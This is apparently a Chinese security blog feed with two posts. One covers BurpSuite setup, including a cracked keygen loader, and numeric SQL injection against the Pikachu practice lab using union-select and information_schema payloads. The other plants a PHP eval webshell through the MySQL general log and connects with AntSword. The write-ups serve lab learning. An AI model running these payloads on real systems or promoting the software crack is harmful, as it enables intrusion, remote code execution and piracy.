    <url>/2023/11/23/%E6%95%B0%E5%AD%97%E5%9E%8Bsql%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><h3 id="下载BurpSuite"><a href="#下载BurpSuite" class="headerlink" title="下载BurpSuite"></a>下载BurpSuite</h3><p><strong>BurpSuite是渗透测试、漏洞挖掘以及Web应用程序测试的最佳工具之一，是一款用于攻击web 应用程序的集成攻击测试平台，可以进行抓包、重放、爆破，包含许多工具，能处理对应的HTTP消息、持久性、认证、代理、日志、警报。</strong></p><p>下载BurpSuite.zip后解压。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img2d28f62abcdc4a328eeabae94273052c.png" alt="img"></p><h4 id="下载安装jdk和jre"><a href="#下载安装jdk和jre" class="headerlink" title="下载安装jdk和jre"></a>下载安装jdk和jre</h4><p><strong>注意：此过程中所有文件安装路径不要包含中文！！！</strong></p><p>1.jdk</p><p><strong>打开刚刚解压出来的文件夹，在“BurpSuite++jdk\jdk-8u201-windows-x64”路径下双击文件“jdk-8u201-windows-x64”进行运行。</strong></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img99c837b0f1944e21921525645348a210.png" alt="img"></p><p><strong>点击【下一步】。</strong></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img5b06501bd14544c1945ac1cbdf036eb1.png" alt="img"></p><p><strong>更改安装路径后点击【下一步】（注意：确保稍后自己可以找到安装位置）。</strong></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img4355e793b6f74c12af3932972ad298e7.png" alt="img"></p><p><strong>安装完成后会弹出下面窗口，点击【确定】即可。</strong></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgb57a900e3bab40e6b4f7f7ccd27fd953.png" alt="img"></p><p>2.jre</p><p><strong>上一步点击【确定】后会自动弹出安装jre的窗口。</strong></p><p><strong>更改安装路径后点击【下一步】（注意：确保稍后自己可以找到安装位置）。</strong></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgd9dea11cbd694be0a7b8b5b1fc98fd7c.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img7a712ae646384214aa1b40ef9c73b569.png" alt="img"></p><p><strong>出现下面窗口代表已经安装完成，点击【关闭】即可。</strong></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img090ce43dae594b5ea73cacc2e2fd456b.png" alt="img"></p><h4 id="配置JAVA环境变量"><a href="#配置JAVA环境变量" class="headerlink" title="配置JAVA环境变量"></a>配置JAVA环境变量</h4><p>1.<strong>鼠标右键点击【此电脑】后点击【属性】</strong></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img078bfef6227149f692a6dac13881b458.png" alt="img"></p><p>2.<strong>点击【高级系统设置】</strong></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imga43fdd16b3fe4a08b12c09dc793820f6.png" alt="img"></p><p>3.<strong>点击【环境变量】</strong></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgca6cdc416b644a07a1d8a1531e3642f6.png" alt="img"></p><p>4.<strong>点击系统环境变量下的【新建】</strong></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgef910f6311834609b3526b311f6091ab.png" alt="img"></p><p>5.<strong>创建系统环境变量“JAVA_HOME”</strong></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img57b658627da54e698ef9ab2833b9b289.png" alt="img"></p><p>6.<strong>创建系统环境变量“CLASSPATH”</strong></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img48025f2cb3ab4efe8327aa86030eea5e.png" alt="img"></p><p>7.<strong>修改“</strong>Path<strong>”变量（单行、列表显示）</strong></p><p><strong>这里可能会遇到两种情况，一种是双击Path变量后编辑页面时单行显示，另一种是列表显示，两种情况的处理方法如下。</strong></p><h5 id="Path变量单行显示-JAVA-HOME-bin-JAVA-HOME-jre-bin"><a href="#Path变量单行显示-JAVA-HOME-bin-JAVA-HOME-jre-bin" class="headerlink" title="Path变量单行显示:;%JAVA_HOME%\bin;%JAVA_HOME%\jre\bin"></a>Path变量单行显示:;%JAVA_HOME%\bin;%JAVA_HOME%\jre\bin</h5><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img2ce31234358c4915824331501651967a.png" alt="img"></p><h5 id="Path变量列表显示-1-JAVA-HOME-bin、2-JAVA-HOME-jre-bin"><a href="#Path变量列表显示-1-JAVA-HOME-bin、2-JAVA-HOME-jre-bin" class="headerlink" title="Path变量列表显示:1.%JAVA_HOME%\bin、2.%JAVA_HOME%\jre\bin"></a>Path变量列表显示:1.%JAVA_HOME%\bin、2.%JAVA_HOME%\jre\bin</h5><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img5be199e4fdea4249bf11583956cae13c.png" alt="img"></p><p>8.<strong>以上三个变量都添加和修改完成后点击【确定】</strong></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgad524a9c940f4814a6e7e1ff8dc2e02a.png" alt="img"></p><p>9.<strong>再次点击【确定】</strong></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img00daf1e3f68c4bfab11fa44cdd9dcd99.png" alt="img"></p><p>10.<strong>验证</strong></p><p><strong>使用键盘“win+R”键输入“cmd”打开命令提示符。</strong></p><p><strong>在命令提示符下分别输入“java”以及“javac”，得到以下页面就代表JAVA成功安装并配置完成。</strong></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgcaf52e6be4494dd3ad04844dff2268b5.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgedcf5f3b741d40228ee35a0b73177697.png" alt="img"></p><h3 id="破解打开BurpSuite"><a href="#破解打开BurpSuite" class="headerlink" title="破解打开BurpSuite"></a>破解打开BurpSuite</h3><p>1.<strong>在“BurpSuite++jdk\burpsuite”路径下双击文件“burp-loader-keygen”进行运行。</strong></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgd6f544a358ed401d82dee66d9c1ea7ed.png" alt="img"></p><p> <strong>补充：可能遇到双击“burp-loader-keygen”没反应的情况，如果遇到这种情况，可以在cmd中用java打开它。（这里打不开大概率是环境变量配置有问题，可以检查一下环境变量配置的是否有问题）</strong></p><p><strong>在文件路径栏输入cmd即可在当前文件打开cmd，然后输入：</strong></p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">java </span>-<span class="hljs-keyword">jar </span><span class="hljs-keyword">burp-loader-keygen.jar</span><br></code></pre></td></tr></table></figure><p>2.<strong>点击【run】</strong></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img28e0beeca22e482c893e4ca237992129.png" alt="img"></p><p> <strong>补充：可能遇到点击“run”没反应的情况，如果遇到这种情况，可以回到文件列表手动点击“运行薄荷.vbs”或者点击“运行.bat”。</strong></p><p>3.等待约7s后<strong>点击【I Accept】</strong></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imge944bc91f83b40df9d018a9d892d38a8.png" alt="img"></p><p>4.将左边窗口里的代码复制后粘贴到右面窗口</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img8aae03e403f64c36aea460ce6199d8e6.png" alt="img"></p><p>5.<strong>点击【Next】</strong></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img6a02febd40cc435fbde3b582180ae673.png" alt="img"></p><p>6.<strong>点击【Manual activation】</strong></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img3cd063fa42584bba803ae139bbea4f36.png" alt="img"></p><p>7.在右面窗口<strong>点击【Copy request】后将代码粘贴到左面窗口</strong></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img669fd4df893e476284c8702e9c2ba43c.png" alt="img"></p><p>8.将左边窗口里的代码复制后粘贴到右面窗口</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img8ad51f9f221f4a459a74b237c123a64a.png" alt="img"></p><p>9.<strong>点击【Next】</strong></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img94849f2840df4fe990bdde788ac1a277.png" alt="img"></p><p>10.<strong>点击【Finish】</strong></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img90b6019916aa4bf19e807a0369fc5a4b.png" alt="img"></p><p>11.<strong>点击【Next】</strong></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img8260cc67d1a94f6492f44535d0b2ea28.png" alt="img"></p><p>12.<strong>点击【</strong>Start Burp<strong>】</strong></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img9f3d41c9235549d09bb50f05864010e7.png" alt="img"></p><h3 id="配置代理"><a href="#配置代理" class="headerlink" title="配置代理"></a>配置代理</h3><p>1.<strong>打开火狐浏览器，点击【扩展和主题】</strong></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img72669c2333804d66bc2c54282615c251.png" alt="img"></p><p>2.<strong>在搜索框输入“FoxyProxy Standard”后搜索</strong></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgb51b39e4f4dc433cb9299c40127542a6.png" alt="img"></p><p>3.点击第一个</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img90dcb7cd19e14429bf4f12c415260c5a.png" alt="img"></p><p>4.点击【添加到 Firefox】</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img9d0fcdb1d1d246608433a61126f0dba0.png" alt="img"></p><p>5.<strong>点击【添加】</strong></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgb332badb93e045f3ab629590f70b6f48.png" alt="img"></p><p>6.在弹出的页面下滑后<strong>点击【返回】</strong></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imge40257c310824aa083796c48b08ea211.png" alt="img"></p><p>7.<strong>点击【添加】</strong></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgf4a9d858b825441ea0f66b97859fb61b.png" alt="img"></p><p>8.代理ip地址和端口处分别输入“127.0.0.1”、“8080”后点击【保存】</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img6f63fb8184ef4ef6aafd6865a8a745e7.png" alt="img"></p><p>9.<strong>得到以下页面即配置完成</strong></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img9882f982c0ab44bf92d4ef866a43dc7f.png" alt="img"></p><h3 id="使用教程"><a href="#使用教程" class="headerlink" title="使用教程"></a>使用教程</h3><p><strong>以抓取百度搜索时的数据包为例</strong></p><p>1.<strong>打开浏览器代理</strong></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgabbdcace269a4660ac7068cb6cd9aab6.png" alt="img"></p><p>2.<strong>开启拦截</strong></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imge132675328d54fd6a2f145e0350daffa.png" alt="img"></p><p>3.开始搜索</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img75d21c8843644219ad1c6526d8b22352.png" alt="img"></p><p>4.第一次使用可能会出现以下弹窗</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img3379407fe31b4986a560dbe04319b912.png" alt="img"></p><p>5.<strong>点击【高级】后点击【接受风险并继续】</strong></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgd382e2612c0d4266b022f90fe45cdd4c.png" alt="img"></p><p>6.再次进行上述步骤后可以看到数据包已经成功抓取到</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img4eb0ef4ce82b4fc3aa4201d14d5c9a1a.png" alt="img"></p><p>若是还是无法使用需将Burp Suite的CA证书导入到浏览器中：</p><p>1.首先要把Burp Suite的CA证书下载到本地</p><p><strong>（1）通过浏览器访问<a href="https://burp,下载证书./">https://burp，下载证书。</a></strong></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgc15b4a1907f34732a73b8e64ba421a00.png" alt="在这里插入图片描述"></p><p>点右边的CA Certifcate即可下载</p><p>不过需要注意的是，必须让浏览器开了127.0.0.1:8080代理才可以，也就是要让Burp Suite能抓到浏览器的http包的情况下，才能访问到 <a href="https://burp./">https://burp。</a></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgimg08de68e4e99a46eb8696ee310da1e968.png" alt="img"></p><p>然后在Chrome浏览器中，打开设置——&gt;搜索代理——&gt;打开计算机的代理设置——&gt;打开使用代理服务器——&gt;设置地址和端口——&gt;保存，注意与上面BurpSuite设置保持一致！</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgimg7b381b98139641269819cfc804a02264.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgimgcd2f92b41a964e31997821b244c2fa04.png" alt="img"></p><p><strong>（2）还有种简单的方法，就是直接在Burp Suite上直接导出证书。</strong></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgimg70eacbd45fd54912b08641605435d38a.png" alt="img"></p><p>这里，直接输入cacert.der, 再Next 就ok了。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgimg582faad67e7d4c5fb3d88424b4fa7358.png" alt="img"></p><p>然后，在Burp Suite 的同级目录下会多出一个刚刚的cacert.der ，这就把CA证书导出来了。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgimg6af28bdb1c1f4952bd75592225c101b6.png" alt="img"></p><p>2.浏览器设置代理并导入CA证书</p><p><strong>Firefox</strong></p><p>选项——&gt;搜索证书——&gt;查看证书</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgimg393728fa371a433cb38189ebb27bbbb6.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgimg81068720940c43e7987637aafa404c45.png" alt="img"></p><p>在【证书颁发机构】中导入即可。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imge12fdff8d0e6477fae5eb471cdcd3a08.png" alt="img"></p><p>打开Firefox——应用程序菜单——扩展和主题——扩展——搜索框输入“proxy”——回车</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgd4e6a90c6a5c4ca9919558fa7d563555.png" alt="img"></p><p>将上图标记的两个附加组件添加到Firefox，下图中我的已添加。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgdf5d447825bb472b9ba3d07c2dc0d517.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img7bc517eca9a64ec5a2c5cc747180ef7a.png" alt="img"></p><p>按下图步骤设置</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img9ac6eb1d06d14ec0b74d2e33018a912d.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img4f07c51e52a94cb983d663674a0a4437.png" alt="img"></p><p>然后打开bp的代理</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgca166ec350d3414fbb82047e32497c09.png" alt="img"></p><p>再打开Burp Suite就可以正常抓取https的包了。</p><h3 id="下载pikachu"><a href="#下载pikachu" class="headerlink" title="下载pikachu"></a>下载pikachu</h3><p>pikachu是一个带有漏洞的Web应用系统，在这里包含了常见的web安全漏洞。如果你是一个Web渗透测试学习人员且正发愁没有合适的靶场进行练习，那么pikachu可能正合你意。</p><p>1.先下载pikachu-master，解压到..&#x2F;www目录下</p><p>2.在..&#x2F;www&#x2F;pikachu-master&#x2F;inc下，修改config.inc.php文件，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgc80c76d775224944892e1610e2d57be8.png" alt="img"></p><p> 3.在..&#x2F;www&#x2F;pikachu-master&#x2F;pkxss&#x2F;inc下，修改config.inc.php文件，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img96d54914838f463996efc1501aaa5412.png" alt="img"></p><p>使用<code>(http://192.168.73.149/pikachu/)</code>进入pikachu页面</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img25327181ad284785aedc5a0c6cde9546.png" alt="img"></p><p>初始化后就可以正常使用了。</p><hr><h2 id="数字型sql注入"><a href="#数字型sql注入" class="headerlink" title="数字型sql注入"></a>数字型sql注入</h2><h3 id="使用Burp-Suite抓取网页"><a href="#使用Burp-Suite抓取网页" class="headerlink" title="使用Burp Suite抓取网页"></a>使用Burp Suite抓取网页</h3><p>打开phpstudy的apache服务和mysql服务，浏览器的扩展打开burp</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgphpstudy.png" alt="phpstudy"></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgburp.png" alt="burp"></p><p>进入pikachu页面，点击数字型注入（post）</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E6%9F%A5%E8%AF%A2.png" alt="查询"></p><p>到Burp Suite界面点击拦截禁用，再点击pikachu页面的查询。会发现pikachu页面无法加载出来（因为Burp Suite将页面拦截了）。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E6%8B%A6%E6%88%AA.png" alt="拦截"></p><p>在代码页面右键发送到重发器，</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E5%8F%91%E9%80%81%E5%88%B0%E9%87%8D%E5%8F%91%E5%99%A8.png" alt="发送到重发器"></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E8%BF%9B%E5%85%A5%E9%87%8D%E5%8F%91%E5%99%A8.png" alt="进入重发器"></p><p>然后将代理的拦截请求关闭在重发器中进行数字型sql注入。</p><hr><h3 id="进行数字型sql注入"><a href="#进行数字型sql注入" class="headerlink" title="进行数字型sql注入"></a>进行数字型sql注入</h3><h4 id="1-找到sql注入的注入点"><a href="#1-找到sql注入的注入点" class="headerlink" title="1.找到sql注入的注入点"></a>1.找到sql注入的注入点</h4><p>在id&#x3D;后面写入1’会报错，输入1则正常使用。可以看出本次的pikachu的传输参数是数字型的（字符型的参数是需要“”或是‘’将参数包裹住，而数字型参数不需要）。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E6%AD%A3%E5%B8%B8%E6%9F%A5%E8%AF%A2.png" alt="正常查询"></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E5%88%A4%E6%96%AD%E6%95%B0%E5%AD%97%E5%9E%8B.png" alt="判断数字型"></p><h4 id="2-判断字段数"><a href="#2-判断字段数" class="headerlink" title="2.判断字段数"></a>2.判断字段数</h4><p>使用<em>order by</em>语句，利用网页报错判断字段数。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgorder%20by.png" alt="order by"></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgorder%20by%202.png" alt="order by 2"></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgorder%20by%203.png" alt="order by 3"></p><p>发现当order by的值为3时网页报错，此时可以判断本此查询存在2个字段。</p><h4 id="3-判断回显点"><a href="#3-判断回显点" class="headerlink" title="3. 判断回显点"></a>3. 判断回显点</h4><p>接下来我们要使用<strong>union select</strong>语句，<strong>联合查询</strong>，通过页面回显找到回显点，再利用其获取我们需要查询的数据。</p><p><strong>注意：UNION 结果集中的列名</strong>总是等于** UNION 中第一个 SELECT 语句中的<strong>列名</strong>。若是字段数不同则会报错。**</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgunion.png" alt="union"></p><p>若是联合查询的内容不显示则将第一个查询的内容判断为假。<code>in=1 and 1=2</code>，这样就可以将第一个查询的内容判断为假，从而显示联合查询的内容。</p><h4 id="4-查询相关内容"><a href="#4-查询相关内容" class="headerlink" title="4.查询相关内容"></a>4.查询相关内容</h4><p>接下来我们利用显错位获取相关内容，这里我们再分几步进行<br>mysql中的information_schema说明<br>information_schema : mysql数据库5.0以上版本，自带数据库，记录了mysql下所有的<strong>库名，表名，列名</strong>等信息。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgimgdab350b12f804181a54b611d43ddf0c.png" alt="dab350b12f804181a54b611d43ddf0c"></p><p>MySQL中的 <strong>database()函数</strong> 返回默认或当前数据库的名称。</p><p>在刚刚的回显点加入database函数，以此得到库名</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E8%8E%B7%E5%BE%97%E5%BA%93%E5%90%8D.png" alt="获得库名"></p><p>判断表名，<code>(select table_name from information_schema.tables where table_schema=&#39;pikachu&#39; limit 0,1)</code>注意这里不能直接写表名tables， 否则它会在<code>pikachu</code>库下找tables表，找不到就会报错。(因为不是在同一个库中)<br>因此需要使用<em>库名.表名</em>的格式：<code>information_schema.tables</code></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E6%9F%A5%E8%AF%A2%E8%A1%A8%E5%90%8D.png" alt="查询表名"></p><p>其中<code>where+限定条件</code>限定查找的库的名字为pikachu。<code>limit+数字，数字</code>第一个数字是限定从第几行开始，第二个数字是限定输出几行。</p><p>判断列名，<code>(select column_name from information_schema.columns where table_schema=&quot;pikachu&quot; and  table_name=&quot;users&quot; limit 0,1)</code>.</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E6%9F%A5%E8%AF%A2%E5%AD%97%E6%AE%B5%E5%90%8D.png" alt="查询字段名"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>SQL手注四部曲：</p><ul><li><strong>判断注入点</strong></li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">id</span>=1 <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=2<br></code></pre></td></tr></table></figure><ul><li><p><strong>判断字段数</strong></p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-attr">id=</span><span class="hljs-number">1</span> <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure></li><li><p><strong>判断回显点</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">id</span>=<span class="hljs-number">1</span> and <span class="hljs-number">1</span>=<span class="hljs-number">2</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure></li><li><p><strong>查询相关内容</strong></p></li></ul><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">database</span>()<br><br>id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>(),(<span class="hljs-keyword">select</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;pikachu&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)<br><br>id=<span class="hljs-number">1</span> ans <span class="hljs-number">1</span>=<span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>(),(<span class="hljs-keyword">select</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=&quot;pikachu&quot; <span class="hljs-keyword">and</span>  <span class="hljs-built_in">table_name</span>=&quot;users&quot; <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)’<br><br><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,flag,<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> uers<br><br></code></pre></td></tr></table></figure><p>mysql5.0以上自动生成的库：</p>]]></content>
    
    
    
    <tags>
      
      <tag>sql注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sql注入</title>
    <link href="/2023/11/22/sql%E6%B3%A8%E5%85%A5/"/>
    <url>/2023/11/22/sql%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h2 id="phpmyadmin页面"><a href="#phpmyadmin页面" class="headerlink" title="phpmyadmin页面"></a>phpmyadmin页面</h2><p>在<strong>在centOS上使用docker-1</strong>文章中，我已经使用docker创建了两个容器：mysql：5.7、phpmydamin&#x2F;phpmyadmin，并使用phpstudy可以在<em>win10</em>机中登录phpmyadmin页面并可以连接本地的数据库。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgphpmyadmin.png" alt="phpmyadmin"></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgmysql.png" alt="mysql"></p><hr><h2 id="利用mysql日志进行sql注入"><a href="#利用mysql日志进行sql注入" class="headerlink" title="利用mysql日志进行sql注入"></a>利用mysql日志进行sql注入</h2><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">show global variables like &#x27;%secure%&#x27;  //查询secure_file_priv值是否为空</span><br><span class="language-xml">show variables like &#x27;%general%&#x27;  //查询general(全局日志设置)</span><br><span class="language-xml">set GLOBAL GENERAL_log=ON   //设置general_log为开启（打开全局日志设置）</span><br><span class="language-xml">set GLOBAL GENERAL_log_file=&#x27;C:/phpstudy_pro/WWW/2.php&#x27;  //设置GENERAL_log_file的地址为&#x27;C:/phpstudy_pro/WWW/2.php&#x27;，将全局日志文件保存到2.php（若没有2.php文件则自动在该地址下创建一个2.php文件）</span><br><span class="language-xml">select &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;   //查询phpinfo（）函数的内容，并返回网页信息</span><br><span class="language-xml">select &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[cmd]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;  //一句话木马</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E6%95%B0%E6%8D%AE%E5%BA%93.png" alt="数据库"></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E6%9F%A5%E7%9C%8B%E5%85%A8%E5%B1%80%E6%97%A5%E5%BF%97.png" alt="查看全局日志"></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgfile%20priv.png" alt="file priv"></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgfile%20priv.png" alt="file priv"></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgphpinfo.png" alt="phpinfo"></p><p>下载antsword软件，设置</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E8%AE%BE%E7%BD%AE.png" alt="设置"></p><p>最后点击这个配置的地址就可以进入地址机</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E4%BE%B5%E5%85%A5.png" alt="侵入"></p>]]></content>
    
    
    
    <tags>
      
      <tag>sql注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>在centOS上使用docker</title>
    <link href="/2023/11/21/%E5%9C%A8centOS%E4%B8%8A%E4%BD%BF%E7%94%A8docker-1/"/>
    <url>/2023/11/21/%E5%9C%A8centOS%E4%B8%8A%E4%BD%BF%E7%94%A8docker-1/</url>
    
